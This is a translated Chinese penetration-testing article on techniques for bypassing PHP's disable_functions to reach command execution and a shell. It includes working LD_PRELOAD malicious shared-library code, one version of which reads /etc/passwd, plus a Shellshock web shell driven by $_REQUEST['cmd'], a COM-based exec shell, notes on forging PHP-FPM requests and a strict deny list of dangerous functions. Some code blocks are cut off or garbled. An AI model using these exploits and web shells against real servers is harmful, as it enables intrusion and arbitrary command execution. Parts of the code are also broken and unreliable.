# PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
在渗透过程中，有很多 PHP 站点往往设置了disable_functions 来禁止用户调用某些危险函数，给 Getshell
带来了很大的不便，本文对一些常见的绕过方法的原理和使用稍做总结，顺便分享一个 Fuzz 方法，学习一下。
如有错误，欢迎师傅们指正
## 0x01 常用姿势
###  1\. 黑名单 bypass
众所周知，disable_functions 是基于黑名单来实现对某些函数使用的限制的，既然是黑名单有时候就难免会有漏网之鱼
PHP 中能直接执行系统程序的函数
    system()
    shell_exec(）
    exec()
    passthru()
    popen()
    proc_open()
    pcntl_exec()
    dl() // 加载自定义 php 扩展
PHP 中执行运算符（反引号）的效果和 shell_exec() 是相同的
一些比较严格的 disable_functions 限制项
    passthru,exec,system,putenv,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv
###  2\. LD_PRELOAD & putenv() bypass disable_functions
Windows？
LD_PRELOAD 是一个 Unix 中比较特殊的环境变量，也产生过很多安全问题
简介
> ​ LD_PRELOAD 是一个可选的 Unix 环境变量，包含一个或多个共享库或共享库的路径，加载程序将在包含 C
> 运行时库（libc.so）的任何其他共享库之前加载该路径。这称为预加载库。
>
> ​ 也就是说它可以影响程序的运行时的链接（Runtime
> linker），它允许你定义在程序运行前优先加载的动态链接库。即我们可以自己生成一个动态链接库加载，以覆盖正常的函数库，也可以注入恶意程序，执行恶意命令。
LD_PRELOAD 绕过 disable_functions 的原理就是劫持系统函数，使程序加载恶意动态链接库文件，从而执行系统命令等敏感操作
举个例子，我们来改变一下 Linux 系统中最常见的命令 —— `id`
`strace -f id`
使用 strace 对应用的系统调用和信号传递的跟踪结果来对应用进行分析，了解应用工作过程的
strace会记录和解析命令进程的所有系统调用以及这个进程所接收到的所有的信号值，要在 Docker 中使用 strace 需要先关闭安全功能再启动
`docker run --security-opt seccomp:unconfined -d xxx`
像这种简单的无参系统函数就是比较好的劫持对象，
`man 2 geteuid` 命令查看 geteuid 系统函数需要什么头文件和格式
    #include 
    #include 
    uid_t geteuid(void){
            system("cat /etc/passwd");
    }
生成动态链接库
`gcc --share -fPIC bad.c -o bad.so`
使用 LD_PRELOAD 加载刚生成的 bad.so，再执行 `id` 命令看看效果
`LD_PRELOAD=./bad.so id`
**LD_PRELOAD 作为进程独占环境变量，它与待执行命令间必须为空白字符**
成功执行的我们自定义的恶意代码，读取了 passwd 文件
通用动态链接库代码
    #include 
    __attribute__((constructor)) void j0k3r(){
        unsetenv("LD_PRELOAD");
        if (getenv("cmd") != NULL){
            system(getenv("cmd"));
        }else{
            system("echo 'no cmd' > /tmp/cmd.output");
        }
    }
​ 利用 GNU C 中的特殊语法 `__attribute__ ((attribute-list))`，当参数为 constructor
时就可以在加载共享库时运行，通常是在程序启动过程中，因为带有”构造函数”属性的函数将在 main() 函数之前被执行，类似的，若是换成 destructor
参数，则该函数会在 main() 函数执行之后或者 exit() 被调用后被自动执行
也就是说在 PHP 运行过程中只要有新程序启动，在我们加载恶意动态链接库的条件下，便可以执行 .so 中的恶意代码
比如 PHP 中经典的 mail() 函数，看看当 PHP 执行 mail() 函数的时候有没有执行程序或者启动新进程
`strace -f php -r "mail('','','','');" 2>&1 | grep -E "execve|fork|vfork"`
​ 可以明显发现 mai() 函数使用 execve 启动了 sendmail，接着可以使用 readelf -Ws 或者 strace 命令查看
sendmail 程序的系统函数调用情况
在 PHP 中使用 putenv() 函数设置环境变量, 仅存活于当前请求期间。在请求结束时环境会恢复到初始状态
    readImage('KKKK.mvg');
    $thumb->writeImage('KKKK.png');
    $thumb->clear();
    $thumb->destroy();
    unlink("KKKK.mvg");
    unlink("KKKK.png");
    }
    AAAA();
    ?>
复现环境 
###  4\. PHP 5.x Shellshock Exploit (bypass disable_functions)
PHP 
    $tmp 2>&1");
         // In Safe Mode, the user may only alter environment variables whose names
         // begin with the prefixes supplied by this directive.
         // By default, users will only be able to set environment variables that
         // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive is empty,
         // PHP will let the user modify ANY environment variable!
         mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actually send any mail
       }
       else return "Not vuln (not bash)";
       $output = @file_get_contents($tmp);
       @unlink($tmp);
       if($output != "") return $output;
       else return "No output, or not vuln.";
    }
    echo shellshock($_REQUEST["cmd"]);
    ?>
###  5\. PHP-FPM/FastCGI bypass disable_functions
​ 大家都知道。Web Server 只是负责分发数据，那如果 Nginx 遇到 php 动态请求该怎么处理，这时就需要了解 PHP-FPM 和
FastCGI 了
​ FastCGI 是用于将交互式程序与 Web 服务器接口的二进制协议。FastCGI 是早期的通用网关接口（CGI）的变体。FastCGI
的主要目的是减少与Web服务器和 CGI 程序接口相关的开销，从而使服务器可以一次处理更多的网页请求。
​ PHP-FPM（ FastCGI 进程管理器）是另一种 PHP FastCGI 实现，具有一些其他功能，可用于各种规模的站点，尤其是繁忙的站点。PHP-FPM 也是用于调度管理 PHP 解析器php-cgi 的管理程序，php-cgi 作为 PHP 自带的解释器，只是个 CGI
程序，除了解析请求返回结果之外，并不能管理进程，也就无法做到修改 php.ini 配置文件后平滑重启
​ 即 FastCGI 是 CGI 协议的升级版，用于封装 webserver 发送给 php 解释器的数据，通过 PHP-FPM 程序按照 FastCGI
协议进行处理和解析数据，返回结果给 webserver
​ PHP5.3 版本之后，PHP-FPM 是内置于 PHP 的，一般来说，尤其是在高并发的情况下，nginx + PHP-FPM 的组合要比 apache
+ mod_php 好很多
那么伪造请求发送给 PHP-FPM 不就可以任意代码执行
脚本：
本地测试
`python fpm.py -c '' -p 9999 127.0.0.1
/var/www/html/test.php`
###  6\. Windows 系统组件 COM
​ COM（Component Object Model）组件对象模型，是一种跨应用和语言共享二进制代码的方法。COM 可以作为 DLL
被本机程序载入也可以通过 DCOM 被远程进程调用
`C:WindowsSystem32` 下的 wshom.ocx 能够提供 WshShell 对象和 WshNetwork 对象接口的访问，也就是提供对本地
Windows shell 和计算机所连接的网络上共享资源的访问
php.ini 中开启 `com.allow_dcom`
`com.allow_dcom = true`
因为是在 Windows，如果在拓展文件夹 php/ext/ 中存在 php_com_dotnet.dll
到 php.ini 中开启拓展
`extension=php_com_dotnet.dll`
重启服务在 phpinfo 中就能看到开启了 com_dotnet
    exec("cmd /c".$command); //调用对象方法来执行命令
    $stdout = $exec->StdOut();
    $stroutput = $stdout->ReadAll();
    echo $stroutput;
    ?>
使用上面的 PHP 代码通过 COM 对象的 exec() 方法即可绕过 disable_functions 执行命令
###  7\. PHP 5.2.3 win32std extension safe_mode and bypass disable_functions
这个貌似比较古老了 
exploit-db 上的 exp
###  8\. FFI 绕过 disable_functions
PHP7.4 的一个新特性 FFI（Foreign Function Interface），即外部函数接口，可以让我们在 PHP 中调用 C 代码
建议在 Docker 中进行测试
    apt-get install libffi-dev
    docker-php-ext-install ffi
通常使用 FFI::cdef 创建一个新的 FFI 对象，下面是官方说明
`public static FFI::cdef ([ string $code = "" [, string $lib ]] ) : FFI`
> Parameters
>
> code